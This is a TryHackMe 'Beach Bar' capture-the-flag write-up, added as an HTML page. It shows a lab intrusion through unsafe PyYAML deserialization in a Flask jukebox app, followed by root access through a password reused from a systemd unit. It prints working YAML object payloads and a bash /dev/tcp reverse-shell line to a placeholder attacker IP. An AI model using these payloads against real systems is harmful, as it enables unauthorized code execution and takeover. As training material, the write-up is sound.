@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beach Bar - TryHackMe Writeup</title>
+
+    <link rel="stylesheet" href="css/writeups.css">
+</head>
+
+<body>
+
+<div class="terminal">
+
+    <h1>Beach Bar — TryHackMe Writeup</h1>
+
+    <div class="writeup-card">
+        <h2>Room Information</h2>
+
+        <p><strong>Category:</strong> Boot2Root</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+
+	<p>🛎️ Concierge Briefing
+		Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone.
+		You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".
+		The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.
+	</p>	
+        <p>
+            The Beach Bar room focuses on identifying an insecure YAML deserialization
+            vulnerability in a Flask application that allows arbitrary Python object
+            execution. After gaining code execution as the <strong>bartender</strong>
+            user, simple Linux enumeration reveals a second service exposing reused
+            credentials, ultimately leading to root.
+        </p>
+    </div>
+
+    <div class="writeup-card">
+        <h2>Enumeration</h2>
+
+        <p>The first step was a full TCP scan.</p>
+
+<pre><code>nmap -sCV -p- 10.144.132.46 -T4</code></pre>
+
+        <p>Results:</p>
+
+<ul>
+<li>22/tcp — SSH</li>
+<li>80/tcp — Gunicorn Flask application</li>
+</ul>
+
+        <p>
+            The web application redirected to a login page titled
+            <strong>Beach Bar</strong>.
+        </p>
+
+        <p>
+            Viewing the page source exposed default credentials:
+        </p>
+
+<pre><code>Username: dj
+Password: dj</code></pre>
+
+        <p>
+            Logging in revealed a dashboard with Import and Export playlist
+            functionality together with the following hint:
+        </p>
+
+<blockquote>
+Bring a set from another night: Export the current playlist as YAML,
+tweak it, and load it back via Import.
+</blockquote>
+
+        <p>
+            Combined with the concierge briefing mentioning that the
+            jukebox had been "wired straight into the floor with the
+            trimmings still attached", this strongly suggested that the
+            import functionality was the intended attack surface.
+        </p>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Testing the YAML Import</h2>
+
+        <p>
+            After exporting the playlist, it was confirmed that the
+            application accepted YAML input.
+        </p>
+
+        <p>
+            The first objective was determining whether the server was
+            using Python's unsafe YAML loader.
+        </p>
+
+        <p>
+            Several payloads were tested.
+        </p>
+
+<h3>Attempt 1</h3>
+
+<pre><code>!!python/object/apply:os.system
+["nc IP PORT"]</code></pre>
+
+<p>No useful response.</p>
+
+<h3>Attempt 2</h3>
+
+<pre><code>!!python/object/apply:os.popen
+["nc IP PORT"]</code></pre>
+
+<p>
+Only a TCP connection was received together with the string:
+</p>
+
+<pre><code>&lt;os._wrap_close object at 0x...&gt;</code></pre>
+
+<p>
+This confirmed that Python objects were being instantiated but no shell
+was returned.
+</p>
+
+<h3>Attempt 3</h3>
+
+<pre><code>!!python/object/new:subprocess
+[["ls","-ail"]]</code></pre>
+
+<p>
+This demonstrated that subprocess objects could be created.
+</p>
+
+<h3>Attempt 4</h3>
+
+<pre><code>!!python/object/new:subprocess.check_output
+[["ls","-ail"]]</code></pre>
+
+<p>
+This successfully executed a command and returned its output:
+</p>
+
+<pre><code>total 24
+app.py
+requirements.txt
+templates/
+...</code></pre>
+
+<p>
+At this stage arbitrary command execution had been confirmed.
+</p>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Obtaining Remote Code Execution</h2>
+
+        <p>
+            After confirming that subprocess execution worked, a reverse
+            shell payload was supplied through the YAML import:
+        </p>
+
+<pre><code>!!python/object/apply:subprocess.Popen
+- [bash, -c, 'bash -i >&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/1234 0&gt;&amp;1']</code></pre>
+
+        <p>
+            A Netcat listener immediately received a shell as:
+        </p>
+
+<pre><code>bartender</code></pre>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Application Analysis</h2>
+
+        <p>
+            With command execution obtained, the application source code
+            was inspected.
+        </p>
+
+<pre><code>/opt/beach-bar/webapp/app.py</code></pre>
+
+        <p>
+            The vulnerable code was:
+        </p>
+
+<pre><code>parsed = yaml.load(content, Loader=yaml.Loader)</code></pre>
+
+        <p>
+            The use of <strong>yaml.Loader</strong> instead of
+            <strong>yaml.SafeLoader</strong> allowed arbitrary Python
+            objects to be deserialized, resulting in Remote Code
+            Execution.
+        </p>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>User Enumeration</h2>
+
+        <p>
+            Basic filesystem enumeration located the user flag.
+        </p>
+
+<pre><code>find /home -name "user.txt" 2&gt;/dev/null</code></pre>
+
+        <p>
+            The flag was stored in:
+        </p>
+
+<pre><code>/home/user.txt</code></pre>
+
+        <p>
+            Reading the file produced the user flag.
+        </p>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Privilege Escalation Enumeration</h2>
+
+        <p>
+            Standard Linux enumeration was performed:
+        </p>
+
+<ul>
+<li>SUID binaries</li>
+<li>Capabilities</li>
+<li>Writable files</li>
+<li>Processes</li>
+<li>Systemd services</li>
+</ul>
+
+        <p>
+            Inspection of running services revealed a custom service:
+        </p>
+
+<pre><code>systemctl status jukeboxd</code></pre>
+
+        <p>
+            Viewing the unit information exposed the complete command line:
+        </p>
+
+<pre><code>systemctl show jukeboxd</code></pre>
+
+<pre><code>ExecStart=
+/opt/beach-bar/venv/bin/python
+/opt/beach-bar/jukeboxd/jukeboxd.py
+--stream-pass SunsetSpritz2024!
+--bitrate 320k</code></pre>
+
+        <p>
+            The service passed a hardcoded password as a command-line
+            argument.
+        </p>
+
+        <p>
+            Testing the credential with sudo revealed that it had been
+            reused as the root password.
+        </p>
+
+<pre><code>su root</code></pre>
+
+<p>Password:</p>
+
+<pre><code>SunsetSpritz2024!</code></pre>
+
+        <p>
+            Root access was successfully obtained.
+        </p>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Root Flag</h2>
+
+        <p>
+            After switching to the root account, the root flag was found
+            inside the root user's home directory.
+        </p>
+
+<pre><code>/root/root.txt</code></pre>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Flags</h2>
+
+        <h3>User</h3>
+
+<pre><code>THM{USER_FLAG}</code></pre>
+
+        <h3>Root</h3>
+
+<pre><code>THM{ROOT_FLAG}</code></pre>
+
+    </div>
+
+    <div class="writeup-card">
+
+        <h2>Attack Path Summary</h2>
+
+<ol>
+<li>Scan the target with Nmap.</li>
+<li>Discover SSH and the Beach Bar web application.</li>
+<li>View page source and recover the <strong>dj: dj</strong> credentials.</li>
+<li>Notice the YAML Import/Export functionality.</li>
+<li>Test Python deserialization using multiple YAML payloads.</li>
+<li>Confirm arbitrary command execution using <code>subprocess.check_output()</code>.</li>
+<li>Execute a reverse shell through <code>subprocess.Popen()</code>.</li>
+<li>Inspect <code>app.py</code> and confirm unsafe use of <code>yaml.load()</code>.</li>
+<li>Locate the user flag in <code>/home/user.txt</code>.</li>
+<li>Enumerate running services.</li>
+<li>Inspect <code>jukeboxd</code> with <code>systemctl show</code>.</li>
+<li>Recover the hardcoded stream password.</li>
+<li>Reuse the password as the root account password.</li>
+<li>Read the root flag.</li>
+</ol>
+
+    </div>
+
+</div>
+
+</body>
+</html>
